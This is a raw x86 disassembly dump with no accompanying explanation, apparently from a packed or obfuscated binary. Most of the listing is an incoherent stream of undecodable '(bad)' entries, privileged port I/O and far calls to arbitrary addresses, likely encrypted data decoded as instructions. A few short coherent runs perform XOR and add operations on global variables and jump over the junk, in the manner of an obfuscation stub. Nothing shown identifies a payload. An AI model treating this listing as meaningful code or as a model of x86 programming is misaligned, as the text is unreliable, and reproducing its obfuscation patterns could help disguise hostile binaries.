  409372:	sbb    eax,0xa6f3bed0
  409377:	loop   0x4093cd
  409379:	xor    DWORD PTR [ebx+0x5da08bdb],0x1b
  409380:	jno    0x409374
  409382:	ror    BYTE PTR [ebx],cl
  409384:	mov    al,0x5d
  409386:	psubq  mm7,mm0
  409389:	xor    esi,DWORD PTR [eax]
  40938b:	int3   
  40938c:	push   cs
  40938d:	jl     0x40940b
  40938f:	jg     0x409394
  409391:	das    
  409392:	fucomp st(1)
  409394:	or     eax,0xc0f5dc4c
  409399:	test   dl,cl
  40939b:	fwait
  40939c:	popa   
  40939d:	hlt    
  40939e:	pop    ecx
  40939f:	sub    BYTE PTR [edi+esi*2+0x4c],al
  4093a3:	popf   
  4093a4:	and    eax,0xf901d894
  4093a9:	inc    ebp
  4093aa:	lea    eax,ss:[ebp-0x48]
  4093ae:	mov    edi,0x9fccb970
  4093b3:	mov    ds:0x8f51bd3f,eax
  4093b8:	test   eax,0x6ae37909
  4093bd:	dec    ebp
  4093be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093bf:	push   eax
  4093c0:	xor    BYTE PTR [ebx+0x7d2ff7f2],dh
  4093c6:	jg     0x409360
  4093c8:	dec    esi
  4093c9:	daa    
  4093ca:	out    dx,eax
  4093cb:	inc    ebp
  4093cc:	mov    dl,0xe5
  4093ce:	adc    DWORD PTR [ecx],edi
  4093d0:	push   cs
  4093d1:	imul   DWORD PTR [esi+0x6059a7ac]
  4093d7:	mov    WORD PTR [esi],?
  4093d9:	jecxz  0x40940e
  4093db:	mov    dl,BYTE PTR [edi+0xff4a7c]
  4093e1:	push   ecx
  4093e2:	mov    al,0xed
  4093e4:	popa   
  4093e5:	add    BYTE PTR [esi+0x5f41823],ah
  4093eb:	pop    esi
  4093ec:	lods   al,BYTE PTR ds:[esi]
  4093ed:	adc    DWORD PTR [ecx+ebp*8],ecx
  4093f0:	popa   
  4093f1:	xchg   ecx,eax
  4093f2:	inc    ebx
  4093f3:	fnstcw WORD PTR [ebx-0xff348d0]
  4093f9:	pop    ds
  4093fa:	jnp    0x409383
  4093fc:	mov    BYTE PTR [eax-0x42],bh
  4093ff:	add    al,0x33
  409401:	push   esp
  409402:	fbld   TBYTE PTR [eax+0x1a]
  409405:	cmp    ecx,eax
  409407:	push   0xe715fbca
  40940c:	jge    0x40939f
  40940e:	cdq    
  40940f:	lds    eax,FWORD PTR [ebp+0x22]
  409412:	(bad)  
  409413:	and    eax,0x3ee3811c
  409418:	arpl   ax,sp
  40941a:	or     al,0xab
  40941c:	pop    esp
  40941d:	mov    eax,0x4d738a9f
  409422:	sbb    eax,0x1bdc677b
  409427:	sub    bh,ah
  409429:	adc    esi,ebx
  40942b:	sbb    DWORD PTR [ebp*1-0x6e12222a],esi
  409432:	xor    DWORD PTR [eax-0x1cd75834],ebp
  409438:	dec    esp
  409439:	clc    
  40943a:	shr    BYTE PTR [edi-0x3fb0a9a1],1
  409440:	stos   BYTE PTR es:[edi],al
  409441:	int3   
  409442:	dec    eax
  409443:	adc    eax,0x822acd44
  409448:	xchg   ecx,eax
  409449:	sbb    ah,BYTE PTR [ecx]
  40944b:	jp     0x40949f
  40944d:	out    0xe7,al
  40944f:	cmp    edi,DWORD PTR [edx]
  409451:	out    0xee,eax
  409453:	mov    esi,0x17b8730
  409458:	xlat   BYTE PTR ds:[ebx]
  409459:	bound  esi,QWORD PTR [ecx+0x46]
  40945c:	loope  0x4094c7
  40945e:	mov    ds:0xd29b4a4b,al
  409463:	nop
  409464:	jb     0x409425
  409466:	mov    bl,0x6e
  409468:	stc    
  409469:	mov    eax,0x4b5bbda7
  40946e:	popa   
  40946f:	and    bh,0x63
  409472:	inc    eax
  409473:	push   edx
  409474:	ins    DWORD PTR es:[edi],dx
  409475:	mov    ebx,0xe00de230
  40947a:	icebp  
  40947b:	(bad)  
  40947c:	repz jge 0x4094c2
  40947f:	xchg   esp,eax
  409480:	fnstenv [ebp-0x6a]
  409483:	pop    ss
  409484:	call   0xa375:0x2416b0c8
  40948b:	sbb    edi,DWORD PTR [ebp-0x27f390ea]
  409491:	in     eax,0x94
  409493:	jp     0x409451
  409495:	sub    eax,0x5f0e2898
  40949a:	or     eax,0x3bc21996
  40949f:	jnp    0x409497
  4094a1:	xchg   edx,eax
  4094a2:	pop    ebp
  4094a3:	dec    ebp
  4094a4:	enter  0xa14e,0x99
  4094a8:	add    BYTE PTR [eax],bh
  4094aa:	inc    eax
  4094ab:	push   ds
  4094ac:	xor    eax,DWORD PTR [ecx+ebp*4-0x6bec3bac]
  4094b3:	lock cmp dl,BYTE PTR [ebp+0x383591ba]
  4094ba:	shr    al,0x55
  4094bd:	pop    es
  4094be:	fnstsw WORD PTR [edx-0x4e]
  4094c1:	aas    
  4094c2:	add    dl,BYTE PTR [edi-0x6ea56446]
  4094c8:	adc    BYTE PTR [edi+0x36eadc27],al
  4094ce:	lea    ecx,ds:0xb25b0141
  4094d4:	and    esp,DWORD PTR [esi+0x616e355]
  4094da:	test   DWORD PTR [ebx+0x42fe1610],edx
  4094e0:	jnp    0x409469
  4094e2:	sub    DWORD PTR [esi+0x6c139649],ebp
  4094e8:	jp     0x409511
  4094ea:	fcomp  DWORD PTR [ecx+esi*4-0x64fd78ba]
  4094f1:	cmp    BYTE PTR [ecx],cl
  4094f3:	inc    edx
  4094f4:	repnz loopne 0x4094c3
  4094f7:	cmp    DWORD PTR [esp+ecx*8],ebx
  4094fa:	fimul  DWORD PTR [ecx-0x6b]
  4094fd:	call   0x225f:0x622c803d
  409504:	mov    esp,0xe539243
  409509:	ss sub eax,0xbf44aa20
  40950f:	add    al,0xe4
  409511:	mov    ch,0xff
  409513:	jns    0x4094a3
  409515:	or     ecx,DWORD PTR [edi]
  409517:	(bad)  
  409518:	aaa    
  409519:	xor    esi,esp
  40951b:	dec    esi
  40951c:	jae    0x4094cc
  40951e:	shl    BYTE PTR [edx+0x20],0xde
  409522:	xor    ch,bh
  409524:	fidivr WORD PTR fs:[eax-0x34]
  409528:	std    
  409529:	xor    eax,0xbc054919
  40952e:	jno    0x4094da
  409530:	dec    edi
  409531:	mov    al,ds:0xcc5f233c
  409536:	sti    
  409537:	xchg   DWORD PTR [edi-0x9],edx
  40953a:	shl    edi,0x8a
  40953d:	jo     0x409580
  40953f:	sub    BYTE PTR cs:[esi+esi*1-0x2ed017ba],cl
  409547:	fstp   QWORD PTR [ecx]
  409549:	fld    TBYTE PTR [ebx-0x63]
  40954c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40954d:	adc    al,0x1c
  40954f:	push   ecx
  409550:	cmp    eax,0xe61cf37b
  409555:	pop    es
  409556:	mov    WORD PTR [esp+esi*4-0x2639131d],cs
  40955d:	and    bh,dl
  40955f:	mov    eax,0x8883a649
  409564:	xchg   BYTE PTR [eax-0x4694bf0c],dh
  40956a:	mov    ebx,0x7ca3f9f4
  40956f:	mov    ecx,DWORD PTR [edi+0x57dcb1e6]
  409575:	xor    ebp,DWORD PTR [edx+0x51]
  409578:	iret   
  409579:	jle    0x4095ed
  40957b:	out    dx,al
  40957c:	cmp    bh,BYTE PTR [esi-0x47a22492]
  409582:	repz inc edx
  409584:	and    DWORD PTR [eax-0x410a88fa],ebp
  40958a:	clc    
  40958b:	jnp    0x409527
  40958d:	sub    al,0x71
  40958f:	jle    0x4095de
  409591:	aad    0xa7
  409593:	sub    eax,0xd7c0f988
  409598:	mov    bh,0xac
  40959a:	fxch   st(1)
  40959c:	mov    ebp,0xbf606fdd
  4095a1:	and    cl,BYTE PTR [ebx-0x6fd96986]
  4095a7:	out    dx,eax
  4095a8:	outs   dx,DWORD PTR ds:[esi]
  4095a9:	and    esi,ecx
  4095ab:	in     al,0xe4
  4095ad:	mov    eax,0x6da266b3
  4095b2:	test   ch,0xec
  4095b5:	mov    ebp,0x419b987f
  4095ba:	jmp    0x4095cc
  4095bc:	pop    edx
  4095bd:	(bad)  
  4095be:	jmp    0x16b4:0xa295be5a
  4095c5:	in     al,dx
  4095c6:	ins    BYTE PTR es:[edi],dx
  4095c7:	add    eax,0xad8f84b
  4095cc:	xchg   edx,eax
  4095cd:	in     al,0x9b
  4095cf:	xor    al,0xa7
  4095d1:	pusha  
  4095d2:	mov    esi,edi
  4095d4:	dec    ebx
  4095d5:	cli    
  4095d6:	jae    0x409592
  4095d8:	cdq    
  4095d9:	dec    esi
  4095da:	or     edx,DWORD PTR [edi-0x66]
  4095dd:	mov    BYTE PTR [eax+0x258130bb],cl
  4095e3:	ficom  WORD PTR [edi+ebp*4]
  4095e6:	repnz push edi
  4095e8:	je     0x40962c
  4095ea:	xchg   edi,esp
  4095ec:	cdq    
  4095ed:	cdq    
  4095ee:	and    dh,dl
  4095f0:	test   eax,0x7c261db8
  4095f5:	call   0x49539188
  4095fa:	jb     0x4095c4
  4095fc:	ficom  WORD PTR [ecx+0x6a9dbfd1]
  409602:	and    DWORD PTR [edx],0x98e5bbca
  409608:	inc    ecx
  409609:	pop    ss
  40960a:	mov    edx,0x8dcf477b
  40960f:	aam    0xaa
  409611:	cs push 0x29575aff
  409617:	jge    0x40968d
  409619:	cld    
  40961a:	push   cs
  40961b:	push   ecx
  40961c:	retf   0xe49b
  40961f:	push   cs
  409620:	mov    ss,esi
  409622:	stos   DWORD PTR es:[edi],eax
  409623:	sub    eax,0x23ddfd88
  409628:	mov    esi,0xb4845948
  40962d:	les    ebp,FWORD PTR [ebx-0x31]
  409630:	dec    ebp
  409631:	jnp    0x4095e5
  409633:	fcomp  st(7)
  409635:	mov    esi,0x8b9b216
  40963a:	stos   BYTE PTR es:[edi],al
  40963b:	call   0x3208:0x84a7b23
  409642:	leave  
  409643:	jb     0x409616
  409645:	jle    0x409636
  409647:	pushf  
  409648:	fcmovnb st,st(0)
  40964a:	daa    
  40964b:	cmp    bl,BYTE PTR [ecx+0x7b]
  40964e:	ss test al,0xe8
  409651:	loopne 0x40967a
  409653:	jbe    0x40966f
  409655:	sbb    bl,BYTE PTR [edx]
  409657:	sbb    BYTE PTR [esi+0x3b],bl
  40965a:	hlt    
  40965b:	(bad)  
  40965c:	or     eax,0x948b3b1a
  409661:	fnsave [esi+ecx*4]
  409664:	test   eax,0x67c09d94
  409669:	adc    eax,0x11298c3a
  40966e:	mov    cl,0xe8
  409670:	push   edi
  409671:	stos   DWORD PTR es:[edi],eax
  409672:	or     eax,0xe9b328ad
  409677:	cmp    ebp,DWORD PTR [edi-0x230eabc8]
  40967d:	jo     0x4096b9
  40967f:	test   esp,edx
  409681:	ficomp WORD PTR [esi-0x161ad0f6]
  409687:	leave  
  409688:	mov    dl,0xe4
  40968a:	inc    ebx
  40968b:	sub    al,0x27
  40968d:	sub    DWORD PTR [esi],eax
  40968f:	call   0xb9c27c29
  409694:	inc    esi
  409695:	inc    ebx
  409696:	arpl   WORD PTR [ebx+0x152207fb],si
  40969c:	(bad)  
  40969d:	fcmove st,st(0)
  40969f:	imul   edx,eax,0x3cd04c06
  4096a5:	pop    ecx
  4096a6:	xor    cl,BYTE PTR [eax]
  4096a8:	sahf   
  4096a9:	inc    BYTE PTR [edx+0x2c]
  4096ac:	mov    dl,dl
  4096ae:	add    dl,BYTE PTR [edi]
  4096b0:	inc    edi
  4096b1:	in     eax,0x4b
  4096b3:	fadd   DWORD PTR [esi]
  4096b5:	adc    al,0x4d
  4096b7:	lock in eax,0xa3
  4096ba:	dec    edi
  4096bb:	jbe    0x4096ee
  4096bd:	enter  0x2972,0x92
  4096c1:	mov    WORD PTR [ebp+0x6c789b1e],cs
  4096c7:	mov    al,0xb4
  4096c9:	fmul   DWORD PTR [edx]
  4096cb:	or     dl,BYTE PTR [edx]
  4096cd:	xor    al,0x8b
  4096cf:	call   0x514619d2
  4096d4:	sub    BYTE PTR [edx-0x37a6df07],al
  4096da:	sub    ebp,ebx
  4096dc:	pop    ecx
  4096dd:	pop    edx
  4096de:	arpl   sp,bx
  4096e0:	xchg   ebp,eax
  4096e1:	sbb    ebp,DWORD PTR [ebx+0x37]
  4096e4:	mov    al,0xbf
  4096e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096e7:	or     al,BYTE PTR [eax]
  4096e9:	adc    DWORD PTR [eax+0x54],ebx
  4096ec:	sub    edi,DWORD PTR [edx+0x3dc77f7e]
  4096f2:	pop    ds
  4096f3:	cs mov ah,0x37
  4096f6:	int    0x6e
  4096f8:	loopne 0x40967e
  4096fa:	push   0x1c
  4096fc:	and    eax,0xeb45916b
  409701:	dec    esi
  409702:	push   0xc6b5bb86
  409707:	mov    DWORD PTR [eax-0x3ddcdb32],ebx
  40970d:	adc    BYTE PTR [edx-0x1ac00cc0],0x3
  409714:	stos   DWORD PTR es:[edi],eax
  409715:	pop    ss
  409716:	daa    
  409717:	sub    eax,0x8bb83250
  40971c:	inc    ebp
  40971d:	or     BYTE PTR [ebx+0x43478f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434793
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x434673
  409745:	add    ecx,DWORD PTR ds:0x4346b7
  40974b:	mov    DWORD PTR ds:0x434673,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	and    eax,0xee94481c
  40976b:	jle    0x4097eb
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	iret   
  409772:	adc    al,0xf1
  409774:	jmp    0x48ec:0x9c3a73de
  40977b:	push   es
  40977c:	add    bh,BYTE PTR ds:0x7748f197
  409782:	cli    
  409783:	xor    DWORD PTR [esi-0x494268f5],ebp
  409789:	scas   al,BYTE PTR es:[edi]
  40978a:	pop    ebp
  40978b:	rcr    BYTE PTR [eax-0x79],1
  40978e:	sbb    dh,0x3a
  409791:	stc    
  409792:	xor    al,0xdb
  409794:	pushf  
  409795:	push   es
  409796:	mov    al,0xb9
  409798:	stos   BYTE PTR es:[edi],al
  409799:	inc    edi
  40979a:	sub    DWORD PTR [ecx],eax
  40979c:	xchg   esp,eax
  40979d:	dec    edx
  40979e:	scas   eax,DWORD PTR es:[edi]
  40979f:	jp     0x4097d6
  4097a1:	push   0x4a
  4097a3:	ins    DWORD PTR es:[edi],dx
  4097a4:	mov    dh,0xc8
  4097a6:	jl     0x409795
  4097a8:	iret   
  4097a9:	mov    bh,0xa7
  4097ab:	jne    0x409764
  4097ad:	jge    0x409769
  4097af:	idiv   BYTE PTR [ebx]
  4097b1:	push   ebp
  4097b2:	cmp    BYTE PTR ds:0x6fc28e84,ch
  4097b8:	pop    ebp
  4097b9:	ret    
  4097ba:	sub    edi,edx
  4097bc:	(bad)  
  4097bd:	(bad)  
  4097be:	sti    
  4097bf:	push   DWORD PTR [ebp+0x78580438]
  4097c5:	dec    ebp
  4097c6:	add    al,BYTE PTR [eax+0x6aec1b8]
  4097cc:	pop    ds
  4097cd:	fsubr  st,st(2)
  4097cf:	addr16 orps xmm5,xmm0
  4097d3:	jmp    0xe286:0x6d4c55e3
  4097da:	loop   0x409829
  4097dc:	or     DWORD PTR [edi-0x61],ebp
  4097df:	shl    BYTE PTR [ebp-0xc7a9a9f],cl
  4097e5:	push   esp
  4097e6:	icebp  
  4097e7:	xor    bh,BYTE PTR [ebx]
  4097e9:	xor    DWORD PTR [ebx*1-0x1387b49],edi
  4097f0:	out    dx,al
  4097f1:	or     ch,BYTE PTR [edi]
  4097f3:	cld    
  4097f4:	stos   DWORD PTR es:[edi],eax
  4097f5:	int3   
  4097f6:	adc    BYTE PTR [edx-0x176f6e89],0x18
  4097fd:	pop    edi
  4097fe:	rcr    ch,1
  409800:	jecxz  0x409853
  409802:	pop    edx
  409803:	test   eax,0xb71ab972
  409808:	int    0xce
  40980a:	jp     0x1c012465
  409810:	fsubr  DWORD PTR [edx]
  409812:	gs (bad) 
  409815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409816:	cmp    eax,0xdd50c443
  40981b:	popa   
  40981c:	mov    ebx,0x4fd4144f
  409821:	mov    eax,DWORD PTR [esi+ecx*1+0x71]
  409825:	cmp    BYTE PTR [eax-0x23],0xf3
  409829:	pop    ebx
  40982a:	out    0xbf,eax
  40982c:	or     DWORD PTR [edi-0x5889b1cd],esp
  409832:	xchg   DWORD PTR [ecx-0x35a0bc48],ebx
  409838:	rcl    BYTE PTR [ebp-0x7ce5de19],cl
  40983e:	aad    0x4f
  409840:	xchg   ecx,eax
  409841:	test   DWORD PTR [ebp-0x230da4c9],eax
  409847:	and    eax,0xb4dcc8fb
  40984c:	and    eax,0x1ecaf4c0
  409851:	jns    0x4f4780b6
  409857:	int3   
  409858:	test   eax,0x7c08ece7
  40985d:	bound  ecx,QWORD PTR [edx+edx*4-0x37]
  409861:	fcmovb st,st(3)
  409863:	loopne 0x409841
  409865:	mov    esi,0xcab1c768
  40986a:	or     ebx,DWORD PTR [edi+0x7d]
  40986d:	dec    edi
  40986e:	lods   eax,DWORD PTR ds:[esi]
  40986f:	(bad)  
  409870:	mov    esi,0x394dfdb0
  409875:	jmp    0x4098d9
  409877:	repnz and BYTE PTR [edx-0x12a15e72],ah
  40987e:	or     DWORD PTR [ebp+0xb],esi
  409881:	mov    ebp,0xfb5da07a
  409886:	lahf   
  409887:	xlat   BYTE PTR ds:[ebx]
  409888:	popf   
  409889:	repnz pop ebp
  40988b:	adc    al,0x1b
  40988d:	popf   
  40988e:	setnp  al
  409891:	cmp    BYTE PTR gs:[eax-0x5b1d99bd],0x9
  409899:	icebp  
  40989a:	mov    BYTE PTR [edi+0x3d],al
  40989d:	inc    eax
  40989e:	fwait
  40989f:	mov    ecx,0x23024fea
  4098a4:	in     al,0x39
  4098a6:	(bad)  [edx]
  4098a8:	mov    eax,ds:0xd95bb4e9
  4098ad:	les    esi,FWORD PTR [eax]
  4098af:	adc    ebx,DWORD PTR [esi]
  4098b1:	out    0x9c,eax
  4098b3:	jecxz  0x4098f8
  4098b5:	imul   edi,DWORD PTR [edi-0x1f5a0052],0xd
  4098bc:	rcr    DWORD PTR [eax+0x5d68af82],1
  4098c2:	mov    ds:0x45f5b4ec,al
  4098c7:	mov    eax,ds:0x518e8cf6
  4098cc:	jbe    0x4098c8
  4098ce:	add    eax,0xd4334743
  4098d3:	ss leave 
  4098d5:	and    eax,0x8d172145
  4098da:	sbb    bl,BYTE PTR [ebp+ecx*2+0x436616b9]
  4098e1:	sub    al,BYTE PTR [eax-0x3f]
  4098e4:	jne    0x4098be
  4098e6:	jmp    0xc39b:0xb83475c9
  4098ed:	imul   edx,DWORD PTR [esi+0x3867143e],0xffffffe7
  4098f4:	cdq    
  4098f5:	xchg   ebx,eax
  4098f6:	aas    
  4098f7:	sub    DWORD PTR [ebx],ebp
  4098f9:	ja     0x4098f2
  4098fb:	js     0x409922
  4098fd:	in     al,dx
  4098fe:	and    esi,eax
  409900:	mov    esi,edi
  409902:	adc    ah,BYTE PTR fs:[ebx]
  409905:	xor    eax,0xdaa04d8d
  40990a:	pusha  
  40990b:	hlt    
  40990c:	stos   DWORD PTR es:[edi],eax
  40990d:	sar    BYTE PTR [eax],1
  40990f:	jno    0x409973
  409911:	addr16 xchg ecx,eax
  409913:	pop    esp
  409914:	xor    ah,0xb
  409917:	(bad)  
  409918:	jl     0x409956
  40991a:	loope  0x4098db
  40991c:	fwait
  40991d:	or     BYTE PTR [esi+0x67aad04],0xac
  409924:	sub    esp,ebp
  409926:	dec    eax
  409927:	(bad)  
  409929:	and    BYTE PTR [eax+0x16],dh
  40992c:	lods   eax,DWORD PTR ds:[esi]
  40992d:	push   es
  40992e:	nop
  40992f:	test   BYTE PTR [ecx+0x5e],0x1b
  409933:	pop    edx
  409934:	daa    
  409935:	jo     0x4098e6
  409937:	loop   0x4098ef
  409939:	inc    ebx
  40993a:	in     eax,dx
  40993b:	xor    al,0x2d
  40993d:	xchg   esp,eax
  40993e:	fdiv   st,st(1)
  409940:	loop   0x409917
  409942:	addr16 in eax,0x35
  409945:	xor    ebp,DWORD PTR [esi+0x5f]
  409948:	or     DWORD PTR [ebx-0x27e3a883],0x85311975
  409952:	out    dx,al
  409953:	lds    edi,FWORD PTR [edx-0x9d8055c]
  409959:	add    BYTE PTR [esi+0x42],0x1d
  40995d:	sub    bh,BYTE PTR [ebp+0x45]
  409960:	inc    eax
  409961:	hlt    
  409962:	retf   
  409963:	stos   BYTE PTR es:[edi],al
  409964:	(bad)  
  409965:	fisttp DWORD PTR [eax-0x52]
  409968:	pop    ecx
  409969:	mov    dl,0x97
  40996b:	test   BYTE PTR [ebp-0x12],bh
  40996e:	mov    ch,0xb4
  409970:	or     dh,ah
  409972:	push   esi
  409973:	imul   esp,DWORD PTR [ebx],0x94b775e7
  409979:	pop    edi
  40997a:	adc    al,0x76
  40997c:	fwait
  40997d:	hlt    
  40997e:	add    ebp,DWORD PTR [ebx]
  409980:	xor    bl,bl
  409982:	push   0x69
  409984:	or     al,0xdc
  409986:	xchg   ebp,eax
  409987:	dec    eax
  409988:	das    
  409989:	dec    edi
  40998a:	mov    ds:0x566f852,al
  40998f:	imul   esp,DWORD PTR [ecx-0x1c],0x1e
  409993:	in     eax,0xd4
  409995:	lods   al,BYTE PTR ds:[esi]
  409996:	test   eax,0xb52152b2
  40999b:	pusha  
  40999c:	and    al,0x74
  40999e:	inc    eax
  40999f:	lods   al,BYTE PTR ds:[esi]
  4099a0:	mov    dl,0xf3
  4099a2:	sub    DWORD PTR [ebp-0x2f7aea6d],edx
  4099a8:	and    edi,DWORD PTR [ecx-0x6f7adb3]
  4099ae:	in     eax,0x95
  4099b0:	jnp    0x409999
  4099b2:	mov    esi,0xd63875ff
  4099b7:	(bad)
  4099ba:	mov    ch,0x1
  4099bc:	in     al,dx
  4099bd:	int3   
  4099be:	add    bl,BYTE PTR [esi-0xe]
  4099c1:	pop    esp
  4099c2:	sbb    edi,eax
  4099c4:	adc    eax,0x8cb7ed5c
  4099c9:	add    DWORD PTR [ecx],ebp
  4099cb:	mov    ?,edx
  4099cd:	pop    edi
  4099ce:	add    ebx,DWORD PTR [edi-0x4790708c]
  4099d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099d5:	xchg   esp,eax
  4099d6:	sub    ch,BYTE PTR [ecx-0x46]
  4099d9:	js     0x409a25
  4099db:	sub    al,0xfc
  4099dd:	fisttp WORD PTR [ecx]
  4099df:	ss sti 
  4099e1:	fimul  WORD PTR [edx]
  4099e3:	outs   dx,DWORD PTR ds:[esi]
  4099e4:	in     al,dx
  4099e5:	pop    ebx
  4099e6:	lea    edi,[edx]
  4099e8:	sti    
  4099e9:	xor    al,0x9b
  4099eb:	mov    esi,0xec33d8c4
  4099f0:	mov    ds:0xaadb497d,al
  4099f5:	inc    esi
  4099f6:	mov    bh,0xca
  4099f8:	jmp    0x9937eff7
  4099fd:	aam    0xa4
  4099ff:	sub    DWORD PTR [ecx+ebp*2-0x3efc8a20],esi
  409a06:	mov    dl,0xb9
  409a08:	jg     0x40998d
  409a0a:	(bad)  
  409a0b:	cdq    
  409a0c:	out    dx,al
  409a0d:	mov    eax,0x5d4f8741
  409a12:	jo     0x409a00
  409a14:	jge    0x4099a4
  409a16:	(bad)  
  409a17:	fidiv  WORD PTR [ebx]
  409a19:	or     eax,DWORD PTR [ebp+eax*1-0x7f]
  409a1d:	sub    esp,DWORD PTR [edx+eax*2+0x2fb4d2f4]
  409a24:	in     eax,dx
  409a25:	and    ebx,ecx
  409a27:	jg     0x4099e7
  409a29:	jecxz  0x4099b8
  409a2b:	pop    ebp
  409a2c:	cmp    bh,BYTE PTR [esi]
  409a2e:	mov    esi,0x5bb2b5e2
  409a33:	pop    esi
  409a34:	adc    al,0xc
  409a36:	loop   0x409a5e
  409a38:	adc    BYTE PTR [eax+ebx*8],al
  409a3b:	ficomp WORD PTR [edi]
  409a3d:	in     eax,dx
  409a3e:	test   BYTE PTR [ecx+ebp*2],al
  409a41:	enter  0x48f7,0x42
  409a45:	jmp    0x409a76
  409a47:	je     0x409a1c
  409a49:	pavgw  mm5,mm4
  409a4c:	adc    eax,0xc99226d
  409a51:	inc    ecx
  409a52:	aad    0x87
  409a54:	(bad)  
  409a55:	std    
  409a56:	xchg   ebx,eax
  409a57:	popf   
  409a58:	inc    eax
  409a59:	add    eax,0xcbda5927
  409a5e:	pop    ebp
  409a5f:	inc    ecx
  409a60:	xor    ecx,DWORD PTR [ebp+ebp*4+0x19]
  409a64:	sahf   
  409a65:	stos   BYTE PTR es:[edi],al
  409a66:	jo     0x409aac
  409a68:	xor    DWORD PTR ss:[ecx],esi
  409a6b:	add    cl,BYTE PTR [ebx+0x407628b0]
  409a71:	(bad)  
  409a72:	ins    BYTE PTR es:[edi],dx
  409a73:	cmc    
  409a74:	or     BYTE PTR [ecx],0xaf
  409a77:	pop    ebp
  409a78:	pop    edx
  409a79:	cmp    eax,0x7c0f08f4
  409a7e:	cld    
  409a7f:	xlat   BYTE PTR ds:[ebx]
  409a80:	icebp  
  409a81:	add    al,0x12
  409a83:	rol    DWORD PTR [eax],0x5
  409a86:	mov    esp,esi
  409a88:	shl    BYTE PTR [esi-0x17737aef],cl
  409a8e:	sbb    eax,0xa29fe439
  409a93:	in     al,dx
  409a94:	push   ebx
  409a95:	pop    esp
  409a96:	adc    eax,0x3f13fec6
  409a9b:	lods   eax,DWORD PTR ds:[esi]
  409a9c:	adc    eax,0xdfa79dd1
  409aa1:	inc    ebx
  409aa2:	xlat   BYTE PTR ds:[ebx]
  409aa3:	verw   WORD PTR [ebx-0x2ac09817]
  409aaa:	fadd   DWORD PTR [ebp-0x2e48cea3]
  409ab0:	sbb    al,0x7b
  409ab2:	fwait
  409ab3:	pop    edx
  409ab4:	xor    eax,0xcd045136
  409ab9:	and    ah,BYTE PTR [ebx+ebp*8-0x51]
  409abd:	shr    bl,0x1f
  409ac0:	mov    ds:0x4a4aa82c,eax
  409ac5:	inc    ecx
  409ac6:	pusha  
  409ac7:	push   esi
  409ac8:	imul   ebp,DWORD PTR [eax-0x1efa8397],0x40
  409acf:	popa   
  409ad0:	inc    esi
  409ad1:	sub    bl,bl
  409ad3:	and    eax,0x79464db2
  409ad8:	lods   eax,DWORD PTR ds:[esi]
  409ad9:	(bad)  
  409ada:	leave  
  409adb:	mov    ds:0xfcfac1a4,al
  409ae0:	push   ecx
  409ae1:	mov    eax,DWORD PTR [ebx-0x15b88411]
  409ae7:	dec    ebx
  409ae8:	xor    BYTE PTR [eax+0x20e7b0a3],bl
  409aee:	pop    ebx
  409aef:	xor    ecx,edx
  409af1:	ss gs mov eax,0xed546c91
  409af8:	mov    WORD PTR [edi+0x5f],cs
  409afb:	fcmovnb st,st(5)
  409afd:	sahf   
  409afe:	ds stos BYTE PTR es:[edi],al
  409b00:	mov    ah,0x27
  409b02:	dec    edx
  409b03:	out    dx,eax
  409b04:	sub    BYTE PTR [ebp+eiz*8-0x73],al
  409b08:	fcom   QWORD PTR ds:0x77ffdfbb
  409b0e:	mov    ds:0xee7aa402,al
  409b13:	hlt    
  409b14:	fxch   st(6)
  409b16:	scas   eax,DWORD PTR es:[edi]
  409b17:	or     al,0xd6
  409b19:	(bad)  
  409b1a:	fsub   DWORD PTR cs:[esi+0x50903559]
  409b21:	mov    eax,ds:0x5680f348
  409b26:	inc    ebp
  409b27:	stc    
  409b28:	mov    cl,0xdc
  409b2a:	xchg   BYTE PTR [edi+eax*2+0x40],cl
  409b2e:	xlat   BYTE PTR ds:[ebx]
  409b2f:	push   ds
  409b30:	dec    ecx
  409b31:	dec    ebx
  409b32:	ins    BYTE PTR es:[edi],dx
  409b33:	icebp  
  409b34:	mov    DWORD PTR [ecx+0x7a],edi
  409b37:	dec    ebp
  409b38:	in     eax,0xea
  409b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b3b:	pop    es
  409b3c:	mov    edx,0x38402ad
  409b41:	cdq    
  409b42:	and    DWORD PTR [ebp-0x80],edi
  409b45:	ror    DWORD PTR [eax],0xc4
  409b48:	inc    ecx
  409b49:	gs pop ebx
  409b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b4c:	cwde   
  409b4d:	call   0x7472:0x344d3246
  409b54:	mov    ah,0x8e
  409b56:	popf   
  409b57:	loop   0x409afc
  409b59:	or     BYTE PTR ds:0x42884716,bl
  409b5f:	and    eax,edx
  409b61:	lods   eax,DWORD PTR ds:[esi]
  409b62:	push   0xfa0ed451
  409b67:	rep lods al,BYTE PTR ds:[esi]
  409b69:	mov    eax,ds:0xc045894a
  409b6e:	sub    DWORD PTR ds:0x434703,edx
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x43465f
  409b7f:	or     DWORD PTR ds:0x4346cf,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x4346ff
  409b8f:	xor    DWORD PTR ds:0x434703,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x4346eb
  409bb7:	mov    edi,DWORD PTR ds:0x4347a3
